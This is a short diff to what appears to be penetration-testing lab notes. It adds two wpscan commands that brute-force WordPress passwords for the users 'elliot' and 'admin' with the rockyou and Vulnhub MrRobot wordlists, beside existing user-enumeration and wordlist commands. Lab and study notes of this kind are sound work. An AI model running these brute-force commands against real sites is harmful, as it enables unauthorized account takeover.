@@ -22,6 +22,8 @@ wpscan --url http://10.10.10.2 --enumerate u
 
 ## Bruteforce Wordpress user's password
 ```
+wpscan -u http://192.168.0.14/ –wordlist /root/Dropbox/Vulnhub/MrRobot/fsocity.dic –username elliot  <-- Bruteforce elliot
+wpscan -u http://10.11.1.234/ --threads 20 --wordlist /usr/share/wordlists/rockyou.txt --username admin  <----Bruteforce admin
 wpscan --url 10.10.10.2/secret --wordlist /usr/share/wordlists/dirb/big.txt --threads 2
 ```
 
